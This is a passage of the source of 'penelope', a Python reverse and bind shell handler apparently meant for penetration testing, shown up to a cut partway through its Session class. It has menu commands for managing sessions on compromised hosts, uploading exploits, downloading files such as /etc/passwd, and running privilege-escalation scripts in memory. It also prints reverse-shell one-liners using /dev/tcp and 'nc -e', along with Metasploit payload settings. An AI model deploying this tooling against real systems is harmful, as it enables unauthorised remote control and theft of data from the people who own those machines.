#!/usr/bin/env python3

# Copyright © 2021 - 2023 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.10.0"

import os
import io
import re
import sys
import tty
import cmd
import ssl
import code
import time
import json
import zlib
import glob
import errno
import shlex
import queue
import struct
import shutil
import select
import socket
import signal
import base64
import string
import random
import termios
import tarfile
import logging
import zipfile
import inspect
import binascii
import textwrap
import argparse
import platform
import threading
import subprocess
import urllib.request

from pathlib import Path
from datetime import datetime
from functools import wraps
from itertools import islice
from collections import deque, defaultdict
from configparser import ConfigParser

try:
	import readline
except ImportError:
	readline = None

if not sys.version_info >= (3, 6):
	print("(!) Penelope requires Python version 3.6 or higher (!)")
	sys.exit()

class MainMenu(cmd.Cmd):

	def __init__(self):
		super().__init__()
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'task', 'tasks'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'connect', 'hints', 'Interfaces'],
			"Miscellaneous"     :['help', 'history', 'reset', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	@property
	def active_sessions(self):
		active_sessions = len(core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def sessions(text, *extra):
		options = list(map(str, core.sessions))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	@staticmethod
	def confirm(text):
		try:
			__class__.set_auto_history(False)
			answer = input(f"\r{paint(f'[?] {text} (y/N): ').yellow}")
			__class__.set_auto_history(True)
			return answer.lower() == 'y'

		except EOFError:
			return __class__.confirm(text)

	@staticmethod
	def set_auto_history(state):
		if readline:
			readline.set_auto_history(state)

	@staticmethod
	def load_history(histfile):
		if readline:
			readline.clear_history()
			if histfile.exists():
				readline.read_history_file(histfile)

	@staticmethod
	def write_history(histfile):
		if readline:
			readline.set_history_length(options.histlength)

			try:
				readline.write_history_file(histfile)

			except FileNotFoundError:
				cmdlogger.debug(f"History file '{histfile}' does not exist")

	def show(self):
		print()
		threading.Thread(target=self.cmdloop, name='Menu').start()

	def set_id(self, ID):
		self.sid = ID
		session_part = f"{paint('Session').green} {paint('[' + str(self.sid) + ']').red} "\
				if self.sid else ''
		self.prompt = f"{paint(f'┍┽ {__program__} ┾┑').magenta} {session_part}> "

	def session(current=False, extra=[]):
		def inner(func):
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if core.sessions:
							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
							return False
						else:
							cmdlogger.warning("No available sessions to perform this action")
							return False
				else:
					if ID:
						if ID.isnumeric() and int(ID) in core.sessions:
							ID = int(ID)
						elif ID not in extra:
							cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def preloop(self):
		__class__.load_history(options.cmd_histfile)

	def postloop(self):
		__class__.write_history(options.cmd_histfile)

	def emptyline(self):
		self.lastcmd = None

	def show_help(self, command):
		help_prompt = re.compile("Run 'help [^\']*' for more information")
		parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = help_prompt.sub('', part)
			modified_parts.append(part)
		print(textwrap.indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					cmdlogger.warning(
						f"No such command: '{command}'. "
						f"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session(extra=['none'])
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use 1		Select the SessionID 1
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		Show active sessions or interact with the SessionID

		Examples:

			sessions		Show active sessions
			sessions 1		Interact with SessionID 1
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for host, sessions in core.hosts.items():
					print('\n➤  ' + OSes[sessions[0].OS] + " " + str(paint(host).RED + ' 💀'))
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'Source')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = 'Reverse shell from ' + str(session.listener) if session.listener else f'Bind shell (port {session.port})'
						table += [ID, paint(session.type).CYAN if session.type == 'PTY' else session.type, source]
					print("\n", textwrap.indent(str(table), "    "), "\n", sep="")
				print(flush=True)
			else:
				print()
				cmdlogger.warning("No sessions yet 😟")
				print()

	@session()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact 1	Interact with SessionID 1
		"""
		return core.sessions[ID].attach()

	@session(extra=['*'])
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill 1		Kill SessionID 1
			kill *		Kill all sessions
		"""
		if ID == '*':
			if not core.sessions:
				cmdlogger.warning("No sessions to kill")
				return False
			else:
				if __class__.confirm(f"Kill all sessions{self.active_sessions}"):
					for session in reversed(list(core.sessions.copy().values())):
						session.kill()
				return
		else:
			core.sessions[ID].kill()

			if options.single_session and not core.sessions:
				core.stop()
				return True

	@session(current=True)
	def do_download(self, remote_path):
		"""
		<glob>...
		Download files / folders from the target

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		if remote_path:
			core.sessions[self.sid].download(remote_path)
		else:
			cmdlogger.warning("No files or directories specified")

	@session(current=True)
	def do_open(self, remote_path):
		"""
		<glob>...
		Download files / folders from the target and open them locally

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_path:
			items = []
			for item_path in remote_path.split():
				items.extend(core.sessions[self.sid].download(item_path))

			if len(items) > options.max_open_files:
				cmdlogger.warning(
					f"More than {options.max_open_files} items selected"
					f" for opening. The open list is truncated to "
					f"{options.max_open_files}."
				)
				items = items[:options.max_open_files]

			for item in items:
				Open(item)
		else:
			cmdlogger.warning("No files or directories specified")

	@session(current=True)
	def do_upload(self, local_globs):
		"""
		<glob|URL>...
		Upload files / folders / HTTP(S)/FTP(S) URLs to the target.
		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
		when the target has no Internet access

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc*				  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download locally the underlying exploit code and upload it to the target
		"""
		if local_globs:
			try:
				for glob in shlex.split(local_globs):
					core.sessions[self.sid].upload(glob, randomize_fname=True)
			except ValueError as e:
				cmdlogger.error(e)
		else:
			cmdlogger.warning("No files or directories specified")

	def show_modules(self):
		table = Table(joinchar=' <-> ')
		table.header = [paint('MODULE NAME').cyan_UNDERLINE, paint('DESCRIPTION').cyan_UNDERLINE]
		for name, info in options.modules.items():
			table += [paint(name).red, info['description']]
		print("\n", table, "\n", sep="")

	@session(current=True)
	def do_run(self, module_name):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules"""
		if module_name:
			module = options.modules.get(module_name)
			if module:
				self.cmdqueue.extend(module['actions'][core.sessions[self.sid].OS])
			else:
				logger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn a new session.

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. On the other tab run: ./penelope.py 5555

			spawn 3333 10.10.10.10	Spawn a reverse shell on the port 3333 of the 10.10.10.10 host
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				options.maintain = num
				refreshed = False
				for host in core.hosts.values():
					if len(host) < num:
						refreshed = True
						host[0].maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
			cmdlogger.info(f"Value set to {paint(options.maintain).yellow} {status}")

	@session(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY.
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		core.sessions[self.sid].upgrade()

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the selected session's local folder. If no session is selected, open the base folder
		"""
		folder = core.sessions[self.sid].directory if self.sid else options.basedir
		Open(folder)

	@session(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a remote command

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			output = core.sessions[self.sid].exec(cmdline, agent_typing=True, preserve_dir=True)
			if output:
				print(output.decode(), end='')
		else:
			cmdlogger.warning("No command to execute")

	@session(current=True)
	def do_task(self, cmdline):
		"""
		<local_script|URL>
		Execute a local script or URL from memory in the target and get the output in a local file

		Examples:
			task https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if cmdline:
			task = core.sessions[self.sid].task(cmdline, localscript=True)
			if not task:
				return False
			#print(paint("Output monitoring command:").blue)
			files = [file.name for file in task['streams'].values()]
			for file in set(files):
				tail_cmd = f'tail -n+0 -f {file}'
				Open(tail_cmd, terminal=True)
				print(tail_cmd)
		else:
			cmdlogger.warning("No command to execute")

	@session(current=True) # TODO
	def do_tasks(self, line):
		"""

		Show assigned tasks
		"""
		table = Table(joinchar=' | ')
		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']

		for sessionid in core.sessions:
			tasks = core.sessions[sessionid].tasks
			for taskid in tasks:
				for stream in tasks[taskid]['streams'].values():
					if stream.closed:
						status = paint('Completed!').GREEN
						break
				else:
					status = paint('Active...').YELLOW

				table += [
					paint(sessionid).red,
					paint(taskid).cyan,
					paint(tasks[taskid]['pid']).blue,
					paint(tasks[taskid]['command']).yellow,
					paint(tasks[taskid]['streams']['1'].name).green,
					status
				]

		if len(table) > 1:
			print(table)
		else:
			logger.warning("No assigned tasks")

	def do_listeners(self, line):
		"""
		[<add|stop> <Iface|IP> <Port>]
		Add / stop / view Listeners

		Examples:

			listeners			Show active Listeners
			listeners add any 4444		Create a Listener on 0.0.0.0:4444
			listeners stop 0.0.0.0 4444	Stop the Listener on 0.0.0.0:4444
		"""
		if line:
			try:
				subcommand, host, port = line.split(" ")
				port = int(port)

			except ValueError:
				try:
					subcommand, host = line.split(" ")
					if subcommand == "stop" and host == "*":
						listeners = core.listeners.copy()
						if listeners:
							for listener in listeners.values():
								listener.stop()
						else:
							cmdlogger.warning("No listeners to stop...")
							return False
						return

				except ValueError:
					pass

				print()
				cmdlogger.error("Invalid HOST - PORT combination")
				self.onecmd("help listeners")
				return False

			if subcommand == "add":
				host = Interfaces().translate(host)
				Listener(host, port)

			elif subcommand == "stop":
				for listener in core.listeners.values():
					if (listener.host, listener.port) == (host, port):
						listener.stop()
						break
				else:
					cmdlogger.warning("No such Listener...")
			else:
				print()
				cmdlogger.error("Invalid subcommand")
				self.onecmd("help listeners")
				return False
		else:
			if core.listeners:
				for listener in core.listeners.values():
					print(listener)
			else:
				cmdlogger.warning("No registered Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		try:
			address, port = line.split(' ')

		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not options.no_attach:
				return True

	def do_hints(self, line):
		"""

		Reverse shell hints based on the registered listeners
		"""
		if core.listeners:
			print()
			for listener in core.listeners.values():
				print(paint(f"{listener} hints:").cyan_UNDERLINE)
				print(listener.hints, end='\n\n')
		else:
			cmdlogger.warning("No registered Listeners to show hints")

	def do_Interfaces(self, line):
		"""

		Show the local network interfaces
		"""
		print(Interfaces())

	def do_reset(self, line):
		"""

		Reset the local terminal
		"""
		if shutil.which("reset"):
			os.system("reset")
		else:
			cmdlogger.error("'reset' command doesn't exist on the system")

	def do_history(self, line):
		"""

		Show Main Menu history
		"""
		if readline:
			self.write_history(options.cmd_histfile)
			if options.cmd_histfile.exists():
				print(open(options.cmd_histfile).read())
		else:
			cmdlogger.error("Python is not compiled with readline support")

	def do_exit(self, line):
		"""

		Exit Penelope
		"""
		if __class__.confirm(f"Exit Penelope?{self.active_sessions}"):
			core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			logger.info("Exited!")
			return True
		return False

	def do_EOF(self, line):
		#Unselect session when one is selected
		#if self.sid:
		#	self.set_id(None)
		#	print()
		#else:
		#	return self.do_exit(line)
		print("exit")
		return self.do_exit(line)

	def do_DEBUG(self, line):
		"""

		Open debug console
		"""
		__class__.write_history(options.cmd_histfile)
		__class__.load_history(options.debug_histfile)
		code.interact(banner=paint(
			"===> Entering debugging console...").CYAN, local=globals(),
			exitmsg=paint("<=== Leaving debugging console..."
		).CYAN)
		__class__.write_history(options.debug_histfile)
		__class__.load_history(options.cmd_histfile)

	def do_SET(self, line):
		"""
		[option, [value]]
		Show / set option values.

		Examples:

			SET			Show all options and their current values
			SET no_upgrade		Show the current value of no_upgrade option
			SET no_upgrade True	Set the no_upgrade option to True
		"""
		if not line:
			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
					for param in options.__dict__ if param != 'modules' ]
			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
			print(table)
			print(f"{paint('modules').cyan}\n{paint(json.dumps(getattr(options, 'modules'), indent=4)).yellow}")
		else:
			try:
				args = line.split(" ", 1)
				param = args[0]
				if len(args) == 1:
					value = getattr(options, param)
					if isinstance(value, (list, dict)):
						value = json.dumps(value, indent=4)
					print(f"{paint(value).yellow}")
				else:
					new_value = eval(args[1])
					old_value = getattr(options, param)
					setattr(options, param, new_value)
					if getattr(options, param) != old_value:
						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")

			except AttributeError:
				cmdlogger.error("No such option")

			except Exception as e:
				cmdlogger.error(f"{type(e).__name__}: {e}")

	def default(self, line):
		if line in ['q', 'quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		elif line in ('recon', 'batch'):
			logger.warning("This command is deprecated. Check the 'run' command")
		else:
			parts = line.split()
			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(
					f"No such command: '{line}'. "
					f"Issue 'help' for all available commands"
				)
			elif len(candidates) == 1:
				cmd = f"{candidates[0]} {' '.join(parts[1:])}"
				print(f"\x1b[1A{self.prompt}{cmd}")
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		subcommands = ["add", "stop"]
		if begidx == 10:
			return [command for command in subcommands if command.startswith(text)]
		if begidx == 14:
			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
		if begidx == 15:
			listeners = [re.search(r'\((.*)\)', str(listener))[1].replace(':', ' ') for listener in core.listeners]
			if len(listeners) > 1:
				listeners.append('*')
			return [listener for listener in listeners if listener.startswith(text)]
		if begidx > 15:
			...#print(line, text)

	# Default cmd module is unable to do that. I will make my own cmd class
	#def complete_upload(self, text, line, begidx, endidx):
	#	print("text: ", shlex.quote(text))
	#	return [item for item in glob.glob(shlex.quote(text) + '*')]

	def complete_use(self, text, line, begidx, endidx):
		return self.sessions(text, "none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.sessions(text, "*")

	def complete_run(self, text, line, begidx, endidx):
		return [module for module in options.modules if module.startswith(text)]


class ControlQueue:

	def __init__(self):
		self._out, self._in = os.pipe()
		self.queue = queue.Queue() # TODO

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		self.queue.put(command)
		os.write(self._in, b'\x00')

	def get(self):
		os.read(self._out, 1)
		return self.queue.get()


class Core:

	def __init__(self):
		self.control = ControlQueue()
		self.rlist = [self.control]
		self.wlist = []
		self.attached_session = None
		self.session_wait_host = None
		self.session_wait = queue.LifoQueue()
		self.started = False
		self.sessionID = 0
		self.listenerID = 0
		self.lock = threading.Lock()
		self.sessions = {}
		self.listeners = {}

	def __getattr__(self, name):
#		if name in ('listeners', 'sessions'):
#			_class = eval(name.capitalize()[:-1])
#			return {item.id:item for item in self.rlist if type(item) is _class}

		if name == 'hosts':
			hosts = defaultdict(list)
			for session in self.sessions.values():
				hosts[session.name].append(session)
			return hosts

		elif name == 'new_listenerID':
			with self.lock:
				self.listenerID += 1
				return self.listenerID

		elif name == 'new_sessionID':
			with self.lock:
				self.sessionID += 1
				return self.sessionID

	@property
	def threads(self):
		return [thread.name for thread in threading.enumerate()]

	def start(self):
		self.started = True
		threading.Thread(target=self.loop, name="Core").start()

	def loop(self):

		while self.started:
			readables, writables, _ = select.select(self.rlist, self.wlist, [])

			for readable in readables:

				# The control queue
				if readable is self.control:
					command = self.control.get()
					if command:
						logger.debug(f"About to execute {command}")
					else:
						logger.debug(f"Core break")
					try:
						exec(command)
					except KeyError: # TODO
						logger.debug("The session does not exist anymore")
					break

				# The listeners
				elif readable.__class__ is Listener:
					_socket, endpoint = readable.socket.accept()
					thread_name = f"NewCon{endpoint}"
					logger.debug(f"New thread: {thread_name}")
					threading.Thread(target=Session, args=(_socket, *endpoint, readable),
						name=thread_name).start()

				# STDIN
				elif readable is sys.stdin:
					if self.attached_session:
						session = self.attached_session

						data = os.read(sys.stdin.fileno(), NET_BUF_SIZE)

						if session.subtype == 'cmd':
							self._cmd = data

						if data == options.escape['sequence']:
							if session.alternate_buffer:
								logger.error(
							"(!) Exit the current alternate buffer program first"
								)
							else:
								session.detach()
						else:
							if session.type == 'Basic': # TODO # need to see
								session.record(data,
									_input=not session.interactive)

							if session.agent:
								data = Messenger.message(Messenger.SHELL, data)

							session.send(data, stdin=True)
					else:
						logger.error("You shouldn't see this error; Please report it")

				# The sessions
				else:
					try:
						data = readable.socket.recv(NET_BUF_SIZE)
						if not data:
							raise OSError

						if hasattr(readable.control_session, 'progress_recv_queue'):
							readable.control_session.progress_recv_queue.put(len(data))

					except OSError:
						logger.debug(f"Died while reading")
						readable.kill()
						threading.Thread(target=readable.maintain).start()
						break

					target = readable.shell_response_buf\
					if not readable.subchannel.active\
					and readable.subchannel.allow_receive_shell_data\
					else readable.subchannel

					if readable.agent:
						for _type, _value in readable.messenger.feed(data):
							#print(_type,_value)
							if _type == Messenger.SHELL:
								target.write(_value)
							elif _type == Messenger.TASK_RESPONSE:
								taskid = _value[:8].decode()
								stream = readable.tasks[taskid]['streams'][_value[8:9].decode()]
								data = _value[9:]
								if not data:
									stream.close()
								else:
									stream.write(data)
							else:
								readable.responses.put(_value)
					else:
						target.write(data)

					shell_output = readable.shell_response_buf.getvalue() # TODO
					if shell_output:
						if readable.is_attached:
							os.write(sys.stdout.fileno(), shell_output)

						readable.record(shell_output)

						if b'\x1b[?1049h' in data:
							readable.alternate_buffer = True

						if b'\x1b[?1049l' in data:
							readable.alternate_buffer = False
						#if readable.subtype == 'cmd' and self._cmd == data:
						#	data, self._cmd = b'', b'' # TODO

						readable.shell_response_buf.seek(0)
						readable.shell_response_buf.truncate(0)

			else:
				for writable in writables:
					with writable.wlock:
						try:
							sent = writable.socket.send(writable.outbuf.getvalue())
							if hasattr(writable.control_session, 'progress_send_queue'):
								writable.control_session.progress_send_queue.put(sent)
						except OSError:
							logger.debug(f"Died while writing")
							writable.kill()
							threading.Thread(target=writable.maintain).start()
							break

						writable.outbuf.seek(sent)
						remaining = writable.outbuf.read()
						writable.outbuf.seek(0)
						writable.outbuf.truncate()
						writable.outbuf.write(remaining)
						if not remaining:
							self.wlist.remove(writable)

	def stop(self):
		options.maintain = 0

		if self.sessions:
			logger.warning(f"Killing sessions...")
			for session in reversed(list(self.sessions.copy().values())):
				session.kill()

		for listener in self.listeners.copy().values():
			listener.stop()

		self.control << 'self.started = False'


def Connect(host, port):

	try:
		port = int(port)
		_socket = socket.socket()
		_socket.settimeout(5)
		_socket.connect((host, port))
		_socket.settimeout(None)

	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")

	except OSError:
		logger.error(f"Cannot reach {host}")

	except OverflowError:
		logger.error("Invalid port number. Valid numbers: 1-65535")

	except ValueError:
		logger.error("Port number must be numeric")

	else:
		if not core.started: core.start()
		logger.info(f"Connected to {paint(host).blue}:{paint(port).red} 🎯")
		session = Session(_socket, host, port)
		if session:
			return True

	return False


class Listener:

	def __init__(self, host=None, port=None):
		self.host = options.interface if host is None else host
		self.host = Interfaces().translate(self.host)
		port = options.port if port is None else port
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)
		self.caller = caller()

		try:
			self.port = int(port)
			self.socket.bind((self.host, self.port))

		except PermissionError:
			error = f"Cannot bind to port {self.port}: Insufficient privileges"

		except socket.gaierror:
			error = "Cannot resolve hostname"

		except OSError as e:
			if e.errno == errno.EADDRINUSE:
				error = f"The port {self.port} is currently in use"

			elif e.errno == errno.EADDRNOTAVAIL:
				error = f"Cannot listen on the requested address"

		except OverflowError:
			error = "Invalid port number. Valid numbers: 1-65535"

		except ValueError:
			error = "Port number must be numeric"

		else:
			self.start()
			return

		if not self.caller == 'spawn':
			logger.error(error)

	def __str__(self):
		return f"Listener({self.host}:{self.port})"

	def __bool__(self):
		return hasattr(self, 'id')

	def fileno(self):
		return self.socket.fileno()

	def start(self):
		logger.info(f"Listening for reverse shells on {paint(self.host).blue} 🚪{paint(self.port).red} ")

		self.socket.listen(5)

		self.id = core.new_listenerID
		core.rlist.append(self)
		core.listeners[self.id] = self
		if not core.started:
			core.start()

		core.control << "" # TODO

		if options.hints:
			print(self.hints)

	def stop(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.listeners[{self.id}].stop()'
			return

		core.rlist.remove(self)
		del core.listeners[self.id]

		try:
			self.socket.shutdown(socket.SHUT_RDWR)
		except OSError:
			pass

		self.socket.close()

		if options.single_session and core.sessions and not self.caller == 'spawn':
			logger.info(f"Stopping {self} due to Single Session mode")
		else:
			logger.warning(f"Stopping {self}")

	@property
	def hints(self):
		presets = [
			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
			"nc -e cmd {} {}"
		]

		output = []
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in Interfaces().list.values()]

		for ip in ips:
			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
			output.extend([preset.format(ip, self.port) for preset in presets])

			output.extend(textwrap.dedent(f"""
			{paint('Metasploit').UNDERLINE}
			set PAYLOAD generic/shell_reverse_tcp
			set LHOST {ip}
			set LPORT {self.port}
			set DisablePayloadHandler true
			""").split("\n"))

			output.append("-" * len(max(output, key=len)))

		#output.append("─" * len(max(output, key=len)))

		return f'\r\n'.join(output)


class LineBuffer:

	def __init__(self):
		self.len = 100
		self.buffer = deque(maxlen=self.len)

	def __lshift__(self, data):
		if data:
			self.buffer.extendleft(data.splitlines(keepends=True))

	def __bytes__(self):
		lines = os.get_terminal_size().lines
		return b''.join(list(islice(self.buffer, 0, lines-1))[::-1])


class Channel:

	def __init__(self, raw=False, expect = []):
		self._read, self._write = os.pipe()
		self.can_use = True
		self.active = False
		self.allow_receive_shell_data = True
		self.control = ControlQueue()

	def fileno(self):
		return self._read

	def read(self):
		return os.read(self._read, NET_BUF_SIZE)

	def write(self, data):
		os.write(self._write, data)


class Session:

	def __init__(self, _socket, target, port, listener=None):
		print("\a", flush=True, end='')

		self.socket = _socket
		self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
		self.socket.setblocking(False)
		self.target, self.port = target, port
		self.ip = _socket.getpeername()[0]
		self._host, self._port = self.socket.getsockname()

		if target == self.ip:
			try:
				self.hostname = socket.gethostbyaddr(target)[0]

			except socket.herror:
				self.hostname = None
				logger.debug(f"Cannot resolve hostname")
		else:
			self.hostname = target

		self.name = f"{self.hostname}~{self.ip}" if self.hostname else self.ip
		self.listener = listener

		self.OS = None
		self.type = None
		self.subtype = None
		self.interactive = None
		self.echoing = None

		self.version = None
		self.user = None

		self.dimensions = None
		self.prompt = None
		self.new = True
		self.version = None

		self.last_lines = LineBuffer()
		self.lock = threading.Lock()
		self.wlock = threading.Lock()

		self.outbuf = io.BytesIO()
		self.shell_response_buf = io.BytesIO()

		self.tasks = dict()
		self.subchannel = Channel()
		self.latency = None

		self.alternate_buffer = False
		self.need_resize = False
		self.agent = False
		self.messenger = Messenger(io.BytesIO)
		self.responses = queue.Queue()

		self.shell_pid = None
		self._bin = defaultdict(lambda: "")
		self._tmp = None
		self._cwd = None

		self.id = core.new_sessionID
		logger.debug(f"Assigned session ID: {self.id}")
		core.rlist.append(self)
		core.sessions[self.id] = self

		if self.determine():

			logger.debug(f"OS: {self.OS}")
			logger.debug(f"Type: {self.type}")
			logger.debug(f"Interactive: {self.interactive}")
			logger.debug(f"Echoing: {self.echoing}")

			if self.name == core.session_wait_host:
				core.session_wait.put(self.id)

			logger.info(
				f"Got {self.source} shell from {OSes[self.OS]} "
				f"{paint(self.name).white_RED}{paint().green} 💀 - "
				f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
			)

			self.directory = options.basedir / self.name
			if not options.no_log:
				self.directory.mkdir(parents=True, exist_ok=True)
				self.logpath = self.directory / f"{self.name}.log"
				self.logfile = open(self.logpath, 'ab', buffering=0)
				if not options.no_timestamps and not self.logpath.exists():
					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ").magenta).encode())

			self.maintain()

			if options.single_session and self.listener:
				self.listener.stop()

			attach_conditions = [
				# Is a reverse shell and the Menu is not active and reached the maintain value
				self.listener and not "Menu" in core.threads and len(core.hosts[self.name]) == options.maintain,

				# Is a bind shell and is not spawned from the Menu
				not self.listener and not "Menu" in core.threads,

				# Is a bind shell and is spawned from the connect Menu command
				not self.listener and "Menu" in core.threads and menu.lastcmd.startswith('connect')
			]

			if hasattr(listener_menu, 'active'):
				os.close(listener_menu.control_w)
				listener_menu.finishing.wait()

			# If no other session is attached
			if core.attached_session is None:
				# If auto-attach is enabled
				if not options.no_attach:
					if any(attach_conditions):
						# Attach the newly created session
						self.attach()

				# If auto-attach is disabled and the menu is not active
				elif not "Menu" in core.threads:
					# Then show the menu
					menu.show()
		else:
			self.kill()

		return

	def __bool__(self):
		return self.socket.fileno() != -1# and self.OS)

	def __repr__(self):
		return (
			f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
			f"interactive={self.interactive}, echoing={self.echoing})"
		)

	def fileno(self):
		return self.socket.fileno()

	@property
	def spare_control_sessions(self):
		return [session for session in self.control_sessions if session is not self]

	@property
	def need_control_sessions(self):
		return [session for session in core.hosts[self.name] if session.need_control_session]

	@property
	def need_control_session(self):
		return self.type == 'PTY' and not self.agent

	@property
	def control_sessions(self):
